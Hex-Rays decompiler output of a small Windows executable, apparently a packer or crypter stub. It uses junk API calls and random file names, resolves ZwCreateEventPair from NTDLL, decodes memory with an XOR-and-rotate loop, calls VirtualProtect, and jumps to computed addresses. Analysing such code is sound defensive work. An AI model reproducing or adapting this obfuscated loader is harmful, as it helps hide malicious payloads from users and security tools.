/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// DWORD __stdcall GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh);
// DWORD __stdcall GetLastError();
// BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// DWORD __stdcall GetFileType(HANDLE hFile);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// LPSTR __stdcall GetCommandLineA();
// HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// BOOL __stdcall CloseHandle(HANDLE hObject);
// HANDLE __stdcall CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
unsigned int __stdcall sub_417F4B(_DWORD *a1, unsigned int a2, int a3);
int start();

//-------------------------------------------------------------------------
// Data declarations

int dword_405000 = -1143714811; // weak
_UNKNOWN loc_405023; // weak
_UNKNOWN loc_41810B; // weak
WCHAR aLfijbnqh0ew5kh[] = L"\u666C\u6A69\u6E42\u4871\u6530\u3577\u484B\u7648\u4B76\u6675\u5173\u6C2E\u3561"; // idb
WCHAR aWmmu8edqx1cnra[] = L"\u6D57\u554D\u6538\u5164\u3178\u6E43\u6172\u5334\u5950\u7A74\u716E\u2E37\u7645j"; // idb
CHAR FileName[] = "bUEFlMyS1b3wzhoQVf6.KAV"; // idb
WCHAR aMxd5wyi1ljolx8[] = L"\u586D\u3564\u7957\u3149\u4A4C\u4C6F\u3878\u6D68\u5354\u2E66\u5A78B"; // idb
CHAR ModuleName[] = "NTDLL.DLL"; // idb
WCHAR aHpvz2sowqwrdql[] = L"\u7048\u7A76\u5332\u574F\u7771\u4452\u4C51\u4161\u6146\u7465\u5A79\u776F\u542E\u7177"; // idb
CHAR aOi8hazujwwwynl[] = "Oi8HazuJwWWYNLg.KHD"; // idb
CHAR aGhqdmpvchhb9vb[] = "gHQdMpvCHHB.9vB"; // idb
CHAR ProcName[] = "ZwCreateEventPair"; // idb


//----- (00417F4B) --------------------------------------------------------
unsigned int __stdcall sub_417F4B(_DWORD *a1, unsigned int a2, int a3)
{
  unsigned int result; // eax

  result = a2 >> 2;
  do
  {
    *a1 += a3;
    *a1 ^= 0x3A7DD96Cu;
    *a1 = __ROL4__(*a1, 11);
    *a1 -= a3;
    *a1 ^= 0xA0E3B908;
    *a1 ^= a3;
    *a1 = __ROL4__(*a1, 219);
    *a1 = -*a1;
    *a1++ -= a3;
    --result;
  }
  while ( result );
  return result;
}

//----- (00417FAB) --------------------------------------------------------
int start()
{
  int *v1; // [esp-1Ch] [ebp-4Ch]
  SIZE_T v2; // [esp-18h] [ebp-48h]
  DWORD v3; // [esp-14h] [ebp-44h]
  DWORD *v4; // [esp-10h] [ebp-40h]
  HMODULE hModule; // [esp+4h] [ebp-2Ch]
  int v6; // [esp+8h] [ebp-28h]
  HANDLE v7; // [esp+Ch] [ebp-24h]
  void (*v8)(void); // [esp+10h] [ebp-20h]
  HANDLE hObject; // [esp+14h] [ebp-1Ch]
  NTSTATUS (__stdcall *ZwCreateEventPair)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES); // [esp+18h] [ebp-18h]
  DWORD flOldProtect; // [esp+1Ch] [ebp-14h] BYREF
  HANDLE v12; // [esp+20h] [ebp-10h]
  HANDLE hFile; // [esp+24h] [ebp-Ch]
  HANDLE v14; // [esp+28h] [ebp-8h]
  HANDLE v15; // [esp+2Ch] [ebp-4h]

  GetLastError();
  hModule = GetModuleHandleA(ModuleName);
  hFile = CreateFileA(FileName, 0x20000000u, 1u, 0, 3u, 0x1A2u, 0);
  if ( hFile != (HANDLE)-1 )
    goto LABEL_3;
  GetFileType((HANDLE)0xFFFFFFFF);
  GetLastError();
  GetCommandLineA();
  ZwCreateEventPair = (NTSTATUS (__stdcall *)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES))GetProcAddress(
                                                                                          hModule,
                                                                                          ProcName);
  GetLastError();
  CloseHandle((HANDLE)0xFFFFFFFF);
  GetFileSize((HANDLE)0xFFFFFFFF, 0);
  GetFileType((HANDLE)0xFFFFFFFF);
  GetFileSize((HANDLE)0xFFFFFFFF, 0);
  v6 = ((int (__cdecl *)(_DWORD, _DWORD, _DWORD))ZwCreateEventPair)(0, 0, 0);
  v14 = CreateFileA(aOi8hazujwwwynl, 0x40000000u, 2u, 0, 3u, 0x1A0u, 0);
  if ( v14 == (HANDLE)-1 )
  {
LABEL_3:
    v8 = (void (*)(void))((char *)&loc_41810B + (v6 ^ 0xC0000005));
    v15 = CreateFileA(aGhqdmpvchhb9vb, 0xC0000000, 4u, 0, 3u, 6u, 0);
    if ( v15 != (HANDLE)-1 )
    {
LABEL_9:
      GetFileSize(v14, 0);
      v8 = (void (*)(void))v6;
      goto LABEL_10;
    }
    v8();
    GetCommandLineA();
    GetLastError();
    v4 = &flOldProtect;
    GetCommandLineA();
    v3 = 64;
    GetFileSize(v15, 0);
    do
    {
      GetCommandLineA();
      v2 = 77623;
      v7 = CreateFileW(aMxd5wyi1ljolx8, 0xA0000000, 1u, 0, 3u, 0x103u, 0);
    }
    while ( v7 != (HANDLE)-1 );
    v1 = &dword_405000;
  }
  if ( CreateFileW(aLfijbnqh0ew5kh, 0x40000000u, 5u, 0, 3u, 0x184u, 0) == (HANDLE)-1 )
  {
    VirtualProtect(v1, v2, v3, v4);
    GetFileSize(v15, 0);
    GetFileType((HANDLE)0xFFFFFFFF);
    v12 = CreateFileW(aHpvz2sowqwrdql, 0xE0000000, 0, 0, 3u, 0x86u, 0);
    GetFileType(v12);
    goto LABEL_9;
  }
LABEL_10:
  hObject = CreateFileW(aWmmu8edqx1cnra, 0, 7u, 0, 3u, 0x183u, 0);
  CloseHandle(hObject);
  ((void (*)(void))((char *)sub_417F4B + (_DWORD)v8 + 1073741819))();
  CloseHandle(v7);
  return ((int (*)(void))loc_405023)();
}
// 4180B7: variable 'v6' is possibly undefined
// 4181A7: variable 'v1' is possibly undefined
// 4181A7: variable 'v2' is possibly undefined
// 4181A7: variable 'v3' is possibly undefined
// 4181A7: variable 'v4' is possibly undefined
// 41824F: variable 'v8' is possibly undefined
// 41827B: variable 'v7' is possibly undefined
// 405000: using guessed type int dword_405000;

// nfuncs=2 queued=2 decompiled=2 lumina nreq=0 worse=0 better=0
// ALL OK, 2 function(s) have been successfully decompiled
